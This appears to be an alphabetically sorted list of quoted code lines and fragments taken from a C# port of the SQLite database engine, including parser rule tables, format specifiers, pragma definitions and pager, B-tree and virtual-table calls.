"new _yyRuleInfo( 193, 2 ),"
"new _yyRuleInfo( 194, 9 ),"
"new _yyRuleInfo( 195, 1 ),"
"new _yyRuleInfo( 195, 2 ),"
"new _yyRuleInfo( 196, 0 ),"
"new _yyRuleInfo( 196, 1 ),"
"new _yyRuleInfo( 197, 2 ),"
"new _yyRuleInfo( 197, 3 ),"
"new _yyRuleInfo( 197, 4 ),"
"new _yyRuleInfo( 198, 0 ),"
"new _yyRuleInfo( 198, 2 ),"
"new _yyRuleInfo( 199, 0 ),"
"new _yyRuleInfo( 199, 2 ),"
"new _yyRuleInfo( 200, 0 ),"
"new _yyRuleInfo( 200, 3 ),"
"new _yyRuleInfo( 201, 0 ),"
"new _yyRuleInfo( 201, 2 ),"
"new _yyRuleInfo( 202, 0 ),"
"new _yyRuleInfo( 202, 3 ),"
"new _yyRuleInfo( 203, 0 ),"
"new _yyRuleInfo( 203, 2 ),"
"new _yyRuleInfo( 203, 4 ),"
"new _yyRuleInfo( 204, 0 ),"
"new _yyRuleInfo( 204, 2 ),"
"new _yyRuleInfo( 205, 0 ),"
"new _yyRuleInfo( 205, 1 ),"
"new _yyRuleInfo( 205, 2 ),"
"new _yyRuleInfo( 206, 7 ),"
"new _yyRuleInfo( 207, 0 ),"
"new _yyRuleInfo( 207, 2 ),"
"new _yyRuleInfo( 208, 1 ),"
"new _yyRuleInfo( 208, 2 ),"
"new _yyRuleInfo( 208, 3 ),"
"new _yyRuleInfo( 208, 4 ),"
"new _yyRuleInfo( 209, 0 ),"
"new _yyRuleInfo( 209, 2 ),"
"new _yyRuleInfo( 209, 3 ),"
"new _yyRuleInfo( 210, 0 ),"
"new _yyRuleInfo( 210, 2 ),"
"new _yyRuleInfo( 211, 0 ),"
"new _yyRuleInfo( 211, 4 ),"
"new _yyRuleInfo( 213, 1 ),"
"new _yyRuleInfo( 213, 3 ),"
"new _yyRuleInfo( 214, 2 ),"
"new _yyRuleInfo( 214, 4 ),"
"new _yyRuleInfo( 215, 1 ),"
"new _yyRuleInfo( 216, 1 ),"
"new _yyRuleInfo( 216, 3 ),"
"new _yyRuleInfo( 217, 3 ),"
"new _yyRuleInfo( 217, 5 ),"
"new _yyRuleInfo( 218, 1 ),"
"new _yyRuleInfo( 218, 2 ),"
"new _yyRuleInfo( 219, 0 ),"
"new _yyRuleInfo( 219, 3 ),"
"new _yyRuleInfo( 220, 1 ),"
"new _yyRuleInfo( 220, 3 ),"
"new _yyRuleInfo( 221, 0 ),"
"new _yyRuleInfo( 221, 1 ),"
"new _yyRuleInfo( 222, 1 ),"
"new _yyRuleInfo( 222, 2 ),"
"new _yyRuleInfo( 223, 0 ),"
"new _yyRuleInfo( 223, 2 ),"
"new _yyRuleInfo( 224, 1 ),"
"new _yyRuleInfo( 224, 2 ),"
"new _yyRuleInfo( 225, 1 ),"
"new _yyRuleInfo( 225, 2 ),"
"new _yyRuleInfo( 226, 0 ),"
"new _yyRuleInfo( 226, 1 ),"
"new _yyRuleInfo( 227, 4 ),"
"new _yyRuleInfo( 227, 5 ),"
"new _yyRuleInfo( 228, 0 ),"
"new _yyRuleInfo( 228, 2 ),"
"new _yyRuleInfo( 229, 0 ),"
"new _yyRuleInfo( 229, 1 ),"
"new _yyRuleInfo( 230, 0 ),"
"new _yyRuleInfo( 230, 2 ),"
"new _yyRuleInfo( 231, 1 ),"
"new _yyRuleInfo( 232, 0 ),"
"new _yyRuleInfo( 232, 1 ),"
"new _yyRuleInfo( 233, 1 ),"
"new _yyRuleInfo( 234, 11 ),"
"new _yyRuleInfo( 235, 2 ),"
"new _yyRuleInfo( 235, 3 ),"
"new _yyRuleInfo( 236, 0 ),"
"new _yyRuleInfo( 236, 1 ),"
"new _yyRuleInfo( 236, 2 ),"
"new _yyRuleInfo( 237, 1 ),"
"new _yyRuleInfo( 237, 3 ),"
"new _yyRuleInfo( 238, 0 ),"
"new _yyRuleInfo( 238, 3 ),"
"new _yyRuleInfo( 239, 0 ),"
"new _yyRuleInfo( 239, 2 ),"
"new _yyRuleInfo( 240, 1 ),"
"new _yyRuleInfo( 240, 5 ),"
"new _yyRuleInfo( 240, 7 ),"
"new _yyRuleInfo( 240, 8 ),"
"new _yyRuleInfo( 241, 1 ),"
"new _yyRuleInfo( 241, 3 ),"
"new _yyRuleInfo( 242, 0 ),"
"new _yyRuleInfo( 242, 2 ),"
"new _yyRuleInfo( 242, 3 ),"
"new _yyRuleInfo( 243, 0 ),"
"new _yyRuleInfo( 243, 1 ),"
"new _yyRuleInfo( 244, 0 ),"
"new _yyRuleInfo( 244, 2 ),"
"new _yyRuleInfo( 245, 1 ),"
"new _yyRuleInfo( 246, 0 ),"
"new _yyRuleInfo( 246, 1 ),"
"new _yyRuleInfo( 247, 7 ),"
"new _yyRuleInfo( 248, 1 ),"
"new _yyRuleInfo( 248, 3 ),"
"new _yyRuleInfo( 249, 0 ),"
"new _yyRuleInfo( 249, 2 ),"
"new _yyRuleInfo( 250, 1 ),"
"new _yyRuleInfo( 250, 3 ),"
"new _yyRuleInfo( 251, 1 ),"
"new _yyRuleInfo( 252, 0 ),"
"new _yyRuleInfo( 252, 2 ),"
"new _yyRuleInfo( 252, 4 ),"
"new et_info(   '%',  0, 0, etPERCENT,    0,  0 ),"
"new et_info(   'E',  0, 1, etEXP,        14, 0 ),"
"new et_info(   'G',  0, 1, etGENERIC,    14, 0 ),"
"new et_info(   'Q',  0, 4, etSQLESCAPE2, 0,  0 ),"
"new et_info(   'S',  0, 2, etSRCLIST,    0,  0 ),"
"new et_info(   'T',  0, 2, etTOKEN,      0,  0 ),"
"new et_info(   'X', 16, 0, etRADIX,      0,  4 ),"
"new et_info(   'c',  0, 0, etCHARX,      0,  0 ),"
"new et_info(   'e',  0, 1, etEXP,        30, 0 ),"
"new et_info(   'f',  0, 1, etFLOAT,      0,  0 ),"
"new et_info(   'g',  0, 1, etGENERIC,    30, 0 ),"
"new et_info(   'i', 10, 1, etRADIX,      0,  0 ),"
"new et_info(   'n',  0, 0, etSIZE,       0,  0 ),"
"new et_info(   'o',  8, 0, etRADIX,      0,  2 ),"
"new et_info(   'p', 16, 0, etPOINTER,    0,  1 ),"
"new et_info(   'q',  0, 4, etSQLESCAPE,  0,  0 ),"
"new et_info(   'r', 10, 3, etORDINAL,    0,  0 ),"
"new et_info(   's',  0, 4, etSTRING,     0,  0 ),"
"new et_info(   'u', 10, 0, etRADIX,      0,  0 ),"
"new et_info(   'w',  0, 4, etSQLESCAPE3, 0,  0 ),"
"new et_info(   'x', 16, 0, etRADIX,      16, 1 ),"
"new et_info(   'z',  0, 4, etDYNSTRING,  0,  0 ),"
"new et_info(  'd', 10, 1, etRADIX,      0,  0 ),"
"new sPragmaType(  ""reverse_unordered_selects"", SQLITE_ReverseOrder  ),"
"new sPragmaType( ""count_changes"",            SQLITE_CountRows     ),"
"new sPragmaType( ""empty_result_callbacks"",   SQLITE_NullCallback  ),"
"new sPragmaType( ""full_column_names"",        SQLITE_FullColNames  ),"
"new sPragmaType( ""fullfsync"",                SQLITE_FullFSync     ),"
"new sPragmaType( ""ignore_check_constraints"", SQLITE_IgnoreChecks  ),"
"new sPragmaType( ""legacy_file_format"",       SQLITE_LegacyFileFmt ),"
"new sPragmaType( ""omit_readlock"",            SQLITE_NoReadlock    ),"
"new sPragmaType( ""read_uncommitted"",         SQLITE_ReadUncommitted ),"
"new sPragmaType( ""short_column_names"",       SQLITE_ShortColNames ),"
"new sPragmaType( ""sql_trace"",                SQLITE_SqlTrace      ),"
"new sPragmaType( ""vdbe_listing"",             SQLITE_VdbeListing   ),"
"new sPragmaType( ""vdbe_trace"",               SQLITE_VdbeTrace     ),"
"new sPragmaType( ""writable_schema"",          SQLITE_WriteSchema"
"nnn"" are assigned the number ""nnn"".  We make"
"nnn"".  Convert ""nnn"" to an integer and"
"noopMutexAlloc,"
"noopMutexEnd,"
"noopMutexEnter,"
"noopMutexFree,"
"noopMutexHeld,"
"noopMutexInit,"
"noopMutexLeave,"
"noopMutexTry,"
"null :"""")"
"null,"
"object p,"
"out = fopen(""vdbe_profile.out"", ""a"")"
"out = sqlite3DbMallocRaw(sqlite3VdbeDb(v), 8)"
"p = vtabDisconnectAll(db, pTab)"
"p,   /"
"p, int nPage)"
"p, int nPagesize, int nReserve, int eFix)"
"p->zBuf[iOfst], iAmt)"
"p.aConstraintUsage[i].argvIndex,"
"p.aConstraint[i].iColumn,"
"p.aConstraint[i].iTermOffset,"
"p.aConstraint[i].op,"
"p.aMem, nMem "
"p.aOp[i].cnt,"
"p.aOp[i].cycles,"
"p.aOrderBy[i].iColumn,"
"p.aVar, nVar "
"p.apArg, nArg "
"p.apCsr,"
"p.azVar, nVar "
"p.endpoint.pChunk.zChunk[iChunkOffset], zWrite, iSpace )"
"p.iOffset, n, z)"
"p.yystack = Array.Resize(p.yystack,newSize)"
"p.zName, P4_STATIC )"
"p.zText[p.nChar], z, N )"
"p=CorruptionFollowingBusyError"">"
"pApp,"
"pArg, 1)"
"pArg, sqlite3_int64 used,int N),"
"pArray, Btree "
"pAux,                     /"
"pAux,"
"pBlocked,                          /"
"pBtree, int idx, u32 "
"pCell[1], pIdxKey )"
"pCell[2], pIdxKey )"
"pClientData,         /"
"pContext,"
"pCost,               /"
"pCur = allocateCursor(p, pOp.p1, 0, -1, 0)"
"pCur, int "
"pCurrent, int "
"pDb, sqlite3_stmt "
"pDef = sqlite3VtabOverloadFunction( db, pDef, nFarg, pFarg.a[0].pExpr )"
"pDef = sqlite3VtabOverloadFunction( db, pDef, nFarg, pFarg.a[1].pExpr )"
"pDef,  /"
"pDest,                        /"
"pEList = sqlite3ExprListAppend( pParse, null, pSelectRowid)"
"pEList = sqlite3ExprListAppend(pParse, 0,"
"pEList = sqlite3ExprListAppend(pParse, pEList, pExpr)"
"pEList = sqlite3ExprListAppend(pParse, pEList,"
"pExpr = sqlite3CreateIdExpr(pParse, pTab.aCol[i].zName)"
"pExpr = sqlite3ExprDup(db, pChanges.a[aXRef[i]].pExpr,0)"
"pExpr,          /"
"pFile.hMutex = CreateMutexW(NULL, FALSE, zName)"
"pFile.hShared = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL,"
"pFrom->xMutexFree,"
"pHighwater, int resetFlag)"
"pHiwtr, int resetFlg)"
"pInClause = sqlite3PExpr( pParse, TK_IN, pWhereRowid, null, null )"
"pJfd,    /"
"pKey, int nKey     /"
"pKey, int nKey)"
"pKey, int nKey, void "
"pMem->z[pMem->n], 0, pMem->u.nZero)"
"pMod,"
"pModule,  /"
"pName contains the name of a database (either ""main"" or"
"pName1,        /"
"pName2,        /"
"pNewExpr = sqlite3PExpr(pParse, TK_MATCH,"
"pNotNull,              /"
"pOrderBy,             /"
"pOrderBy, 0, pLimit, pOffset )"
"pOut.z[pIn2.n], pIn1.z, pIn1.n )"
"pPageSize is set to the old, retained page size before returning."
"pPager, Pgno pgno)"
"pPager, Pgno pgno, DbPage "
"pPager, int n)"
"pPager, int op, int iSavepoint)"
"pPager,"
"pPager->xCodecSizeChng(pPager->pCodec, pPager->pageSize,"
"pPager.dbFileVers, dbFileVers, sizeof(pPager.dbFileVers))"
"pPager.zJournal[nPathname], ""-journal"", 8)"
"pParse,                  /"
"pParse,        /"
"pParse, Table "
"pParse, Token "
"pParse, const char"
"pParse,"
"pParse.aAlias[pParse.nAliasAlloc], 0,"
"pPrimaryKey,           /"
"pSchema,      /"
"pSchema->tblHash, zName, nName, pTab)"
"pSelTab = sqlite3ResultSetOfSelect(pParse, pSel)"
"pSelect = sqlite3SelectNew( pParse, pEList, pSelectSrc, pWhere, null, null,"
"pSelect = sqlite3SelectNew(pParse, pEList, pSrc, pWhere, 0, 0, 0, 0, 0, 0)"
"pSelectRowid = sqlite3PExpr( pParse, TK_ROW, null, null, null )"
"pSelectSrc = sqlite3SrcListDup(pParse.db, pSrc,0)"
"pSource,                      /"
"pSpace,          /"
"pSrc,      /"
"pSrc,"
"pSrc.a[iStart], 0, sizeof(pSrc.a[0])"
"pStmt, N,  sqlite3_value_text16, COLNAME_NAME)"
"pStmt, N, (const void"
"pStmt, N, sqlite3_value_text, COLNAME_COLUMN)"
"pStmt, N, sqlite3_value_text, COLNAME_DATABASE)"
"pStmt, N, sqlite3_value_text, COLNAME_TABLE)"
"pTab = sqlite3FindTable(db, zTableName, zDbName)"
"pTab, sqlite3_index_info "
"pTab,"
"pTab.aCol[j].zName, db.aDb[iDb].zName)"
"pTable, char "
"pTo) - offsetof(sqlite3_mutex_methods, xMutexFree))"
"pTo->xMutexFree, "
"pUserData, xFunc, xStep, xFinal)"
"pVTab, P4_VTAB)"
"pVTab, sqlite3_index_info"
"pVTab, sqlite3_vtab_cursor "
"pVTable->pVtab, "
"pVfs, pPager.zJournal, pPager.jfd, flags, jrnlBufferSize(pPager)"
"pVfs,"
"pVtab = sqlite3GetVTable(pParse->db, pTab)->pVtab"
"pVtab, const char "
"pVtab, int nArg, const char "
"pVtabIdx.idxNum, pVtabIdx.idxStr)"
"pWC,               /"
"pWC,"
"pWhereRowid = sqlite3PExpr( pParse, TK_ROW, null, null, null )"
"pazResult,    /"
"pcache1, 0, sizeof( pcache1 ) )"
"pnColumn,        /"
"pnPage left unchanged. Or,"
"pnRow,           /"
"pp is not zero, that means that the space has already"
"ppBtree,        /"
"ppDb,         /"
"ppDb, 0, DB_SchemaLoaded) ){"
"ppDb, even if an error occurs.  The only exception is that"
"ppIdxInfo = pIdxInfo = allocateIndexInfo(pParse, pWC, pSrc, pOrderBy)"
"ppPage, int clrFlag)"
"ppPager,"
"ppStmt,  /"
"ppVTab, char"
"prNotFound, then"
"prereqColumn = exprTableUsage( pMaskSet, pLeft )"
"prereqExpr = exprTableUsage( pMaskSet, pRight )"
"ptrmapCheckPages(apNew, nNew)"
"ptrmapCheckPages(pParent, 1)"
"ptrmapGet(pBt, child, ref e, ref n)"
"ptrmapGet(pBt, ovfl, ref e, ref n)"
"public static int sqlite3_get_table_cb( object pArg, i64 nCol, object Oargv, object Ocolv )"
"public static string sqlite3_column_name16(sqlite3_stmt pStmt, int N){"
"put32bits( zBuf, n, (u32)( i "
"put32bits( zBuf, n, (u32)( i >> 32 ) )"
"put32bits( zBuf, n, (u32)Process.GetCurrentProcess().Id )"
"put32bits( zBuf, n, (u32)dt.Ticks )"
"pzCollSeq,     /"
"pzDataType,    /"
"pzErr = sqlite3MPrintf(db, ""%s"", zErr)"
"pzErr = sqlite3MPrintf(db, ""no such module: %s"", zMod)"
"pzErr = sqlite3MPrintf(db, ""vtable constructor failed: %s"", zModuleName)"
"pzErr = sqlite3MPrintf(db, zFormat, pTab->zName)"
"pzErrMsg = """""
"pzErrMsg = sqlite3DbStrDup(0, zErrmsg)"
"pzErrMsg = sqlite3_mprintf(""%s"",res.zErrMsg)"
"r1, t2, sizeof(r1))==0 )"
"randomness)(int,void"
"rc = allocateBtreePage(pBt, ref pRoot, ref pgnoRoot, 1, 0)"
"rc = db->xAuth(db->pAuthArg, SQLITE_READ, pTab->zName, zCol, zDBase,"
"rc = db->xAuth(db->pAuthArg, code, zArg1, zArg2, zArg3, pParse->zAuthContext)"
"rc = openDatabase(zFilename8, ppDb,"
"rc = pModulE.xColumn(pCur.pVtabCursor, sContext, pOp.p2)"
"rc = pModulE.xFilter(pVtabCursor, iQuery, pOp.p4.z, nArg, apArg)"
"rc = pModulE.xOpen(pVtab, pVtabCursor)"
"rc = pModule.xRowid(pC.pVtabCursor, "
"rc = pModule.xUpdate(pVtab, nArg, apArg, "
"rc = pVtab.pModulE.xRename(pVtab, pName.z)"
"rc = pVtab.pModule.xBestIndex(pVtab, p)"
"rc = pager_incr_changecounter(pPager, 0)"
"rc = pager_incr_changecounter(pPager, 1)"
"rc = querySharedCacheTableLock(p, iTab, lockType)"
"rc = setSharedCacheTableLock(p, iTab, lockType)"
"rc = sqlite3ApiExit(db, rc)"
"rc = sqlite3AuthCheck(pParse, SQLITE_UPDATE, pTab.zName,"
"rc = sqlite3AuthCheck(pParse, type, zAuthArg, 0, 0)"
"rc = sqlite3BtreeLockTable( db.aDb[p1].pBt, pOp.p2, isWriteLock )"
"rc = sqlite3CreateFunc(db, zFunc8, nArg, eTextRep, p, xFunc, xStep, xFinal)"
"rc = sqlite3CreateFunc(db, zFunctionName, nArg, SQLITE_UTF16LE,"
"rc = sqlite3CreateFunc(db, zFunctionName, nArg, SQLITE_UTF8,"
"rc = sqlite3Init(db, zErrMsg)"
"rc = sqlite3LockAndPrepare(db, zSql8, -1, saveSqlFlag, ref ppStmt, ref zTail8)"
"rc = sqlite3OsFileSize(p.pReal, pSize)"
"rc = sqlite3OsOpen(p.pVfs, p.zJournal, pReal, p.flags, 0)"
"rc = sqlite3OsRead(p->pReal, zBuf, iAmt, iOfst)"
"rc = sqlite3OsSync(p.pReal, flags)"
"rc = sqlite3OsTruncate(p.pReal, size)"
"rc = sqlite3OsWrite(p.pReal, p.zBuf, p.iSize, 0)"
"rc = sqlite3OsWrite(p.pReal, zBuf, iAmt, iOfst)"
"rc = sqlite3Prepare16(db,zSql,nBytes,false,ref ppStmt,ref pzTail)"
"rc = sqlite3Prepare16(db,zSql,nBytes,true,ref ppStmt,ref pzTail)"
"rc = sqlite3VdbeMemSetStr(pOut, pOp->p4.z, -1, SQLITE_UTF8, SQLITE_STATIC)"
"rc = sqlite3VdbeMemTranslate(pMem, (u8)desiredEnc)"
"rc = sqlite3VtabBegin(db, pVTab)"
"rc = sqlite3VtabCallCreate(db, pOp.p1, pOp.p4.z, p.zErrMsg)"
"rc = sqlite3VtabCallDestroy(db, pOp.p1, pOp.p4.z)"
"rc = sqlite3_exec(db, zSql, (dxCallback) sqlite3_get_table_cb, res, ref pzErrMsg)"
"rc = sqlite3_wsd_init(4096, 24)"
"rcauth = sqlite3AuthCheck(pParse, SQLITE_DELETE, pTab->zName, 0, zDb)"
"realvalue, nsd)"
"ref byte[] pzCollSeq,  /"
"ref byte[] pzDataType, /"
"ref int pNotNull,      /"
"ref int pPrimaryKey,   /"
"ref int pnColumn,         /"
"ref int pnRow,            /"
"ref sqlite3_stmt ppStmt,  /"
"ref sqlite3_stmt ppStmt, /"
"ref string[] pazResult,   /"
"res = sqlite3OsFileControl( pFile, SQLITE_SET_LOCKPROXYFILE,"
"res.zErrMsg = """""
"return accessPayload(pCsr, offset, amt, (byte[] "
"return bindText(pStmt, i, zData, nData, xDel, SQLITE_UTF16NATIVE)"
"return pager_datahash(pPage.pPager.pageSize, (unsigned char "
"return sqlite3ApiExit(0, rc)"
"return sqlite3Atoi64(z, pResult)"
"return sqlite3OsOpen(pVfs, zName, pJfd, flags, 0)"
"return sqlite3ValueText(pVal, SQLITE_UTF16BE)"
"return sqlite3ValueText(pVal, SQLITE_UTF16LE)"
"return sqlite3ValueText(pVal, SQLITE_UTF16NATIVE)"
"return winceLockFile(phFile, SHARED_FIRST, 0, 1, 0)"
"s "", indent "
"s GROUP BY "", indent, """" )"
"s HAVING "", indent, """" )"
"s ORDER BY "", indent, """" )"
"s WHERE "", indent, """" )"
"s"", nId, zId )"
"s"", zType2, n, pParse.sNameToken.z"
"s()"", nId, zId )"
"s()"","
"s)"", indent "
"sContext, 0, sizeof( sContext ) )"
"sContext, 0, sizeof(sContext))"
"sContext.s, MEM_Null)"
"sContext.s, encoding)"
"sContext.s, pDest)"
"sCost, pp)"
"sLocal, t)"
"sMem, 0, sizeof(sMem))"
"sNC, 0, sNC ).Length"
"sNC, 0, sNC).Length"
"sNC, 0, sizeof( sNC ) )"
"sNC, 0, sizeof(sNC) )"
"sNC, p, zOrigDb, zOrigTab, zOrigCol)"
"sName, 0, sizeof(NameContext))"
"sSELECT(%p) "", indent, """", p )"
"snprintf)(int,char"
"sql,                           /"
"sqlite3 db,               /"
"sqlite3 db,              /"
"sqlite3 db,            /"
"sqlite3 db,"
"sqlite3AuthCheck(pParse, SQLITE_DELETE, zTab, 0, zDb) ){"
"sqlite3AuthContextPush( pParse, sContext, p.name )"
"sqlite3AuthContextPush(pParse, sContext, pTab.zName)"
"sqlite3BitvecSet(pPager.pInJournal, pgno)"
"sqlite3BtreeCommitPhaseOne(p.pSrc, null)"
"sqlite3BtreeSchema(Btree , int, void("
"sqlite3BtreeTripAllCursors(p, rc)"
"sqlite3CodecAttach(db, db.nDb-1, zKey, nKey)"
"sqlite3CodecGetKey(db, 0, (void"
"sqlite3ConnectionBlocked(p.db, pBlock)"
"sqlite3ConnectionBlocked(p.db, pBt.pWriter.db)"
"sqlite3ConnectionBlocked(p.db, pIter.pBtree.db)"
"sqlite3CreateIdExpr(pParse, ""_rowid_""))"
"sqlite3DbFree(db, p.zErrMsg)"
"sqlite3DbStrDup(sqlite3 db, const char "
"sqlite3DebugPrintf( ""  constraint[%d]: col=%d termid=%d op=%d usabled=%d"
"sqlite3DebugPrintf( ""  estimatedCost=%g"
"sqlite3DebugPrintf( ""  idxNum=%d"
"sqlite3DebugPrintf( ""  idxStr=%s"
"sqlite3DebugPrintf( ""  orderByConsumed=%d"
"sqlite3DebugPrintf( ""  orderby[%d]: col=%d desc=%d"
"sqlite3DebugPrintf( ""  usage[%d]: argvIdx=%d omit=%d"
"sqlite3Error(db, rc, (rc"
"sqlite3Error(db, rc, (zErrMsg"
"sqlite3ErrorMsg( pParse, ""failed to set lock proxy file"" )"
"sqlite3ErrorMsg( pParse, ""unsupported encoding: %s"", zRight )"
"sqlite3ErrorMsg(pParse, ""%s"", pVtab.zErrMsg)"
"sqlite3ErrorMsg(pParse, ""%s"", sqlite3ErrStr(rc))"
"sqlite3ErrorMsg(pParse, ""ORDER BY without LIMIT on %s"", zStmtType)"
"sqlite3ErrorMsg(pParse, ""access to %s.%s is prohibited"",pTab->zName,zCol)"
"sqlite3ErrorMsg(pParse, ""access to %s.%s.%s is prohibited"","
"sqlite3ErrorMsg(pParse, ""authorizer malfunction"")"
"sqlite3ErrorMsg(pParse, ""not authorized to use function: %s"","
"sqlite3ErrorMsg(pParse, ""not authorized"")"
"sqlite3ErrorMsg(pParse, ""out of memory"")"
"sqlite3ErrorMsg(pParse, ""recursive triggers not supported (%s)"","
"sqlite3ErrorMsg(pParse, ""too many columns in result set"")"
"sqlite3ErrorMsg(pParse, ""too many terms in %s BY clause"", zType)"
"sqlite3ErrorMsg(pParse, ""too many terms in ORDER BY clause"")"
"sqlite3ErrorMsg(pParse,"
"sqlite3ExprCode( pParse, pExpr, iReg )"
"sqlite3ExprCode( pParse, pWC.a[iTerm].pExpr.pRight, iReg "
"sqlite3ExprCollSeq(Parse pParse, Expr pExpr)"
"sqlite3ExprDelete(pParse.db, ref pLimit)"
"sqlite3ExprDelete(pParse.db, ref pOffset)"
"sqlite3ExprDelete(pParse.db, ref pWhere)"
"sqlite3ExprDup(db, pRowid,0), 0)"
"sqlite3ExprListDelete(pParse.db, pEList)"
"sqlite3ExprListDelete(pParse.db, pOrderBy)"
"sqlite3ExprSetColl(Parse pParse, Expr "
"sqlite3ExprSetHeight(pParse, pInClause)"
"sqlite3GlobalConfig.mnReq = va_arg(ap, int)"
"sqlite3GlobalConfig.nHeap = va_arg(ap, int)"
"sqlite3GlobalConfig.pHeap = va_arg(ap, void"
"sqlite3IoTrace( ""SQL %s"
"sqlite3MemFree,"
"sqlite3MemInit,"
"sqlite3MemMalloc,"
"sqlite3MemRealloc,"
"sqlite3MemRoundup,"
"sqlite3MemShutdown,"
"sqlite3MemSize,"
"sqlite3OsCurrentTime(db.pVfs, rT)"
"sqlite3OsFileControl( pFile, SQLITE_GET_LOCKPROXYFILE,"
"sqlite3OsFullPathname(pVfs, zFilename, nFullPathname, zFullPathname)"
"sqlite3OsSleep( db.pVfs, 1000000 )"
"sqlite3PagerLockingMode(sqlite3BtreePager(db.aDb[0].pBt),"
"sqlite3PcacheIterateDirty(pPager.pPCache, pager_set_pagehash)"
"sqlite3ReleaseTempRange( pParse, iReg, nConstraint "
"sqlite3Select(pParse, pSelect, ref dest)"
"sqlite3SelectDelete(pParse.db, pSelect)"
"sqlite3SelectDestInit(dest, SRT_Table, ephemTab)"
"sqlite3SetString( ref p.zErrMsg, db, ""database table is locked: "", z )"
"sqlite3StatusSet(SQLITE_STATUS_PARSER_STACK,"
"sqlite3StrICmp(zLeft, ""hexrekey"")==0) ){"
"sqlite3ValueSetStr(db->pErr, -1, sqlite3ErrStr(db->errCode),"
"sqlite3ValueSetStr(pTmp, -1, zName, SQLITE_UTF8, SQLITE_STATIC)"
"sqlite3ValueSetStr(pVal, -1, zFilename, SQLITE_UTF16NATIVE, SQLITE_STATIC)"
"sqlite3ValueSetStr(pVal, -1, zSql, SQLITE_UTF16NATIVE, SQLITE_STATIC)"
"sqlite3VdbeAddOp2( v, OP_Integer, j - 1, iReg "
"sqlite3VdbeAddOp2( v, OP_Integer, pVtabIdx.idxNum, iReg )"
"sqlite3VdbeAddOp2( v, OP_ResultRow, 1, 1 )"
"sqlite3VdbeAddOp2(v, OP_Close, ephemTab, 0)"
"sqlite3VdbeAddOp2(v, OP_Integer, 1, pDest.iParm)"
"sqlite3VdbeAddOp2(v, OP_Next, ephemTab, addr"
"sqlite3VdbeAddOp2(v, OP_OpenEphemeral, ephemTab, pTab.nCol"
"sqlite3VdbeAddOp3(v, OP_Column,  ephemTab, 0, iReg)"
"sqlite3VdbeAddOp3(v, OP_Column, ephemTab, (pRowid"
"sqlite3VdbeAddOp3(v, OP_Column, ephemTab, i"
"sqlite3VdbeAddOp4( pVdbe, OP_TableLock, p1, p.iTab, p.isWriteLock,"
"sqlite3VdbeAddOp4( v, OP_String8, 0, 1, 0, proxy_file_path, 0 )"
"sqlite3VdbeAddOp4( v, OP_String8, 0, i, 0, zName, 0 )"
"sqlite3VdbeAddOp4( v, OP_VFilter, iCur, addrBrk, iReg, pVtabIdx.idxStr,"
"sqlite3VdbeAddOp4( v, OP_VRename, i, 0, 0, pVtab, P4_VTAB )"
"sqlite3VdbeAddOp4(v, OP_VBegin, 0, 0, 0, vtab, P4_VTAB)"
"sqlite3VdbeAddOp4(v, OP_VOpen, iCur, 0, 0,"
"sqlite3VdbeAddOp4(v, OP_VUpdate, 0, 1, iRowid, pVTab, P4_VTAB)"
"sqlite3VdbeAddOp4(v, OP_VUpdate, 0, pTab.nCol"
"sqlite3VdbeJumpHere(v, addr)"
"sqlite3VdbeMemMove(pDest, sContext.s)"
"sqlite3VdbeMemPrettyPrint(pMem, zBuf)"
"sqlite3VdbeMemSetStr(pCtx.s, z, n, SQLITE_UTF16BE, xDel)"
"sqlite3VdbeMemSetStr(pCtx.s, z, n, SQLITE_UTF16LE, xDel)"
"sqlite3VdbeMemSetStr(pCtx.s, z, n, SQLITE_UTF16NATIVE, xDel)"
"sqlite3VdbePrintOp(out, i, p.aOp[i])"
"sqlite3VdbePrintOp(stdout, origPc, p.aOp[origPc])"
"sqlite3VdbeSetColName( v, 0, COLNAME_NAME,"
"sqlite3VdbeSetColName(v, i, COLNAME_COLUMN, zOrigCol, SQLITE_TRANSIENT)"
"sqlite3VdbeSetColName(v, i, COLNAME_DATABASE, zOrigDb, SQLITE_TRANSIENT)"
"sqlite3VdbeSetColName(v, i, COLNAME_TABLE, zOrigTab, SQLITE_TRANSIENT)"
"sqlite3VdbeSetNumCols( v, 1 )"
"sqlite3VtabMakeWritable(pParse, pTab)"
"sqlite3_bind()],"
"sqlite3_column_database_name16(sqlite3_stmt pStmt, int N){"
"sqlite3_column_decltype16(sqlite3_stmt pStmt, int N){"
"sqlite3_column_origin_name16(sqlite3_stmt pStmt, int N){"
"sqlite3_column_table_name16(sqlite3_stmt pStmt, int N){"
"sqlite3_column_text16(sqlite3_stmt pStmt, int i){"
"sqlite3_config(SQLITE_CONFIG_MALLOC, "
"sqlite3_context context,"
"sqlite3_context pCtx,"
"sqlite3_file pJfd,        /"
"sqlite3_file pJfd,    /"
"sqlite3_key(db, zKey, i/2)"
"sqlite3_key(db, zRight, sqlite3Strlen30(zRight))"
"sqlite3_query_plan[nQPlan], """
"sqlite3_query_plan[nQPlan], ""{} "", 3 )"
"sqlite3_query_plan[nQPlan], ""{}"", 2 )"
"sqlite3_query_plan[nQPlan], pLevel.plan.u.pIdx.zName, n)"
"sqlite3_query_plan[nQPlan], z, n )"
"sqlite3_rekey(db, zKey, i/2)"
"sqlite3_rekey(db, zRight, sqlite3Strlen30(zRight))"
"sqlite3_result_text(context, """
"sqlite3_result_text(context, zResult, 4, SQLITE_TRANSIENT)"
"sqlite3_snprintf( 1000, ref  z, ""%s"", pOp.p4.z )"
"sqlite3_snprintf(int,char"
"sqlite3_snprintf(nBuf, zBuf, ""OsError 0x%x (%u)"", error, error)"
"sqlite3_snprintf(nTemp, ref zTemp, ""vtab:%p:%p"", pVtab, pVtab.pModule)"
"sqlite3_snprintf(pVfs.mxPathname, zFull, ""%s"", zRelative)"
"sqlite3_stmt pStmt,"
"sqlite3_vfs pVfs,         /"
"static BOOL winceCreateLock(string zFilename, sqlite3_file pFile){"
"static bool isLookaside( sqlite3 db, object p )"
"static byte[] qlite3_column_table_name(sqlite3_stmt pStmt, int N){"
"static byte[] sqlite3_column_database_name(sqlite3_stmt pStmt, int N){"
"static byte[] sqlite3_column_origin_name(sqlite3_stmt pStmt, int N){"
"static int cellSize(MemPage pPage, int iCell) { return -1"
"static int hasReadConflicts(Btree pBtree, Pgno iRoot){"
"static int jrnlFileSize(sqlite3_file pJfd, sqlite_int64 pSize){"
"static int jrnlSync(sqlite3_file pJfd, int flags){"
"static int jrnlTruncate(sqlite3_file pJfd, sqlite_int64 size){"
"static int querySharedCacheTableLock(Btree p, Pgno iTab, u8 eLock){"
"static int setSharedCacheTableLock(Btree p, Pgno iTable, u8 eLock){"
